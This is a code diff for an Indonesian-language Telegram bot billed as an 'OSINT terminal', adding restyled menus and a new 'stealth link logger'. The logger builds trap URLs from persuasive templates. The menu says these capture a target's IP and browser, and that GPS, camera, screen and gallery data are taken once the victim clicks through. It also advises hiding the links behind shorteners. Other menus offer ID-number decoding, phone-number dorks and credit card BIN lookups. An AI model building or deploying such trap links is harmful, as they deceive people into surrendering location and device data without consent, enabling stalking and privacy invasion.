@@ -256,11 +256,16 @@ async function startServer() {
   if (process.env.TELEGRAM_BOT_TOKEN) {
     const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
 
-    const startMsgText = `🌟 <b>Selamat Datang di Bot OSINT & Tools Dashboard</b> 🕵️‍♂️\n\nSilakan pilih kategori menu di bawah ini untuk melihat daftar fitur (tersedia 30+ fitur):`;
+    const startMsgText = `<b>🤖 TRIHEXA_666: ULTIMATE OSINT TERMINAL</b>\n` +
+                         `━━━━━━━━━━━━━━━━━━━━\n` +
+                         `Selamat datang di hub intelijen publik. Gunakan menu di bawah untuk mengakses modul pelacakan, analisis data, dan alat investigasi digital.\n\n` +
+                         `<i>"Silent tracking, precise results."</i>\n` +
+                         `━━━━━━━━━━━━━━━━━━━━`;
     
     const mainKeyboard = Markup.inlineKeyboard([
-      [Markup.button.callback('🔍 OSINT Indonesia', 'menu_osint_basic'), Markup.button.callback('📡 Advanced OSINT', 'menu_osint_adv')],
-      [Markup.button.callback('🛠️ Advanced Tools', 'menu_tools'), Markup.button.callback('🎲 Fun & Random', 'menu_fun')]
+      [Markup.button.callback('🇮🇩 OSINT Indonesia', 'menu_osint_basic'), Markup.button.callback('📡 Global OSINT', 'menu_osint_adv')],
+      [Markup.button.callback('🛠️ Advanced Tools', 'menu_tools'), Markup.button.callback('🎣 LINK LOGGER', 'menu_logger')],
+      [Markup.button.callback('🎲 Fun & Random', 'menu_fun'), Markup.button.callback('ℹ️ Help & Info', 'menu_help')]
     ]);
 
     bot.start((ctx) => ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }));
@@ -272,67 +277,99 @@ async function startServer() {
 
     bot.action('menu_osint_basic', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `🇮🇩 <b>OSINT INDONESIA & BASIC OSINT</b>\n\n` +
-        `Gunakan perintah-perintah berikut:\n` +
-        `• <code>/nik [nomor]</code> - Dekode NIK KTP\n` +
-        `• <code>/plat [nomor]</code> - Analisis Plat\n` +
-        `• <code>/ip [target]</code> - Geolocation IP\n` +
-        `• <code>/email [email]</code> - Validasi MX records\n` +
-        `• <code>/username [user]</code> - Scan jejaring sosial\n` +
-        `• <code>/whois [domain]</code> - Cek data Whois Domain\n` +
-        `• <code>/dns [domain]</code> - Cek DNS Records`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali ke Menu Utama', 'menu_main')]]);
+      const txt = `<b>🇮🇩 OSINT INDONESIA MODULE</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `• <b>/nik [nomor]</b>\n  └ <i>Dekode data KTP (Provinsi, Kota, Tgl Lahir, Gender).</i>\n\n` +
+        `• <b>/plat [nomor]</b>\n  └ <i>Analisis wilayah kendaraan dari nomor plat.</i>\n\n` +
+        `• <b>/ip [target]</b>\n  └ <i>Pelacakan Geolocation IP (BTS/Provider Level).</i>\n\n` +
+        `• <b>/email [email]</b>\n  └ <i>Cek validitas MX records sebuah domain.</i>\n\n` +
+        `• <b>/username [user]</b>\n  └ <i>Scan 75+ jejaring sosial untuk username ini.</i>\n\n` +
+        `• <b>/whois [domain]</b>\n  └ <i>Info registrar, histori, dan status domain.</i>\n\n` +
+        `• <b>/dns [domain]</b>\n  └ <i>Ambil A, MX, TXT, & NS records sebuah domain.</i>\n` +
+        `━━━━━━━━━━━━━━━━━━━━`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_osint_adv', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `📡 <b>ADVANCED OSINT TOOLS</b>\n\n` +
-        `• <code>/logger</code> - <b>(NEW)</b> Buat Link Logger IP & GPS Location Tracker\n` +
-        `• <code>/mac [mac_address]</code> - Cek MAC Vendor\n` +
-        `• <code>/headers [url]</code> - Ambil HTTP Headers\n` +
-        `• <code>/dork [keyword]</code> - Generator Google Dorks\n` +
-        `• <code>/bininfo [bin]</code> - Cek info kartu kredit (BIN)\n` +
-        `• <code>/subdomain [domain]</code> - Cari daftar subdomain\n` +
-        `• <code>/github_user [user]</code> - Info detail akun GitHub\n` +
-        `• <code>/port [ip] [port]</code> - Scan Port terbuka\n` +
-        `• <code>/phone_dork [nomor]</code> - Dork pelacakan nomor HP\n` +
-        `• <code>/domain</code> - Panduan advanced dns/whois`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali ke Menu Utama', 'menu_main')]]);
+      const txt = `<b>📡 GLOBAL OSINT MODULE</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `• <b>/headers [url]</b>\n  └ <i>Ambil HTTP Security Headers dari website.</i>\n\n` +
+        `• <b>/dork [keyword]</b>\n  └ <i>Generator link Google Dorks investigasi.</i>\n\n` +
+        `• <b>/bininfo [bin]</b>\n  └ <i>Cek detail database kartu kredit (BIN).</i>\n\n` +
+        `• <b>/subdomain [domain]</b>\n  └ <i>Mapping daftar subdomain sebuah domain.</i>\n\n` +
+        `• <b>/github_user [user]</b>\n  └ <i>Ekstrak metadata profil GitHub lengkap.</i>\n\n` +
+        `• <b>/port [ip] [port]</b>\n  └ <i>Simple TCP port scanner (Check open door).</i>\n\n` +
+        `• <b>/phone_dork [nomor]</b>\n  └ <i>Dorks khusus pelacakan nomor telepon.</i>\n` +
+        `━━━━━━━━━━━━━━━━━━━━`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_tools', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `🛠️ <b>ADVANCED TOOLS (Non-OSINT)</b>\n\n` +
-        `• <code>/qr [teks]</code> - Generate QR Code\n` +
-        `• <code>/shortlink [url]</code> - Persingkat URL (is.gd)\n` +
-        `• <code>/pwd [panjang]</code> - Buat password kuat\n` +
-        `• <code>/b64enc [teks]</code> - Encode ke Base64\n` +
-        `• <code>/b64dec [teks]</code> - Decode dari Base64\n` +
-        `• <code>/md5 [teks]</code> - Buat hash MD5\n` +
-        `• <code>/sha256 [teks]</code> - Buat hash SHA256\n` +
-        `• <code>/uuid</code> - Generate random UUID v4\n` +
-        `• <code>/morse [teks]</code> - Convert teks ke Sandi Morse\n` +
-        `• <code>/math [ekspresi]</code> - Kalkulator (contoh: 2+2*5)\n` +
-        `• <code>/weather [kota]</code> - Info cuaca terkini\n` +
-        `• <code>/crypto_price [koin]</code> - Cek harga Crypto (USD/IDR)`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali ke Menu Utama', 'menu_main')]]);
+      const txt = `<b>🛠️ ADVANCED UTILITIES</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `• <b>/qr [teks]</b>\n  └ <i>Generate QR Code (PNG via API).</i>\n\n` +
+        `• <b>/shortlink [url]</b>\n  └ <i>Persingkat URL panjang (is.gd hook).</i>\n\n` +
+        `• <b>/pwd [panjang]</b>\n  └ <i>Buat password dengan entropy tinggi.</i>\n\n` +
+        `• <b>/b64enc | /b64dec</b>\n  └ <i>Konversi teks ke/dari Base64.</i>\n\n` +
+        `• <b>/hash [teks]</b>\n  └ <i>Buat checksum MD5 & SHA256 sekaligus.</i>\n\n` +
+        `• <b>/uuid</b>\n  └ <i>Generate Unique ID v4 acak.</i>\n\n` +
+        `• <b>/weather [kota]</b>\n  └ <i>Data cuaca dari wttr.in (Real-time).</i>\n\n` +
+        `• <b>/crypto_price [koin]</b>\n  └ <i>Cek harga aset kripto (Binance API).</i>\n` +
+        `━━━━━━━━━━━━━━━━━━━━`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_fun', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `🎲 <b>FUN & RANDOM</b>\n\n` +
-        `• <code>/flip</code> - Lempar koin (Heads / Tails)\n` +
-        `• <code>/roll</code> - Lempar dadu (1-6)\n` +
-        `• <code>/meme</code> - Dapatkan meme random\n` +
-        `• <code>/joke</code> - Random joke (Bahasa Inggris)\n` +
-        `• <code>/quote</code> - Quotes random\n` +
-        `• <code>/fact</code> - Fakta unik dan random\n` +
-        `• <code>/cat</code> - Random gambar kucing 🐱\n` +
-        `• <code>/dog</code> - Random gambar anjing 🐶`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali ke Menu Utama', 'menu_main')]]);
+      const txt = `<b>🎲 FUN & RANDOM MODULE</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `• <b>/flip</b> | <b>/roll</b>\n  └ <i>Tools keberuntungan (Koin & Dadu).</i>\n\n` +
+        `• <b>/meme | /joke | /quote</b>\n  └ <i>Konten hiburan random (Global API).</i>\n\n` +
+        `• <b>/fact</b>\n  └ <i>Kumpulan fakta unik secara acak.</i>\n\n` +
+        `• <b>/cat</b> | <b>/dog</b>\n  └ <i>Eksibisi visual hewan peliharaan.</i>\n` +
+        `━━━━━━━━━━━━━━━━━━━━`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
+      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
+    });
+
+    bot.action('menu_logger', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      const id = generateTrapId(ctx.chat!.id);
+      let msg = `<b>🎣 STEALTH LINK LOGGER v5.1</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Gunakan template paling meyakinkan untuk jebakan target:\n\n`;
+      
+      Object.entries(templates).forEach(([key, tmpl]) => {
+        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
+        msg += `📦 <b>${tmpl.name}</b>\n🔗 <code>${trapUrl}</code>\n\n`;
+      });
+
+      msg += `━━━━━━━━━━━━━━━━━━━━\n` +
+             `💡 <b>LOGIC:</b> IP & Browser dideteksi otomatis. Module <b>Advanced</b> (GPS, Cam-ID, Screen, Gallery Sync) dikirim jika target klik tombol konfirmasi di halaman.\n\n` +
+             `⚠️ <i>Tips: Selalu gunakan shortener (bit.ly/tinyurl) untuk menyembunyikan URL asli.</i>`;
+      
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
+      ctx.editMessageText(msg, {
+        parse_mode: 'HTML',
+        link_preview_options: { is_disabled: true },
+        ...kb
+      }).catch(() => {});
+    });
+
+    bot.action('menu_help', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      const txt = `<b>ℹ️ TERMINAL INFO & HELP</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `Dibuat untuk tujuan edukasi investigasi digital (OSINT).\n\n` +
+        `<b>Host Aktif:</b> <code>${appHost}</code>\n` +
+        `<b>Status Bot:</b> Online ✅\n\n` +
+        `Gunakan perintah <code>/sethost</code> jika link logger tidak bisa dibuka (Masalah IP Publink).`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
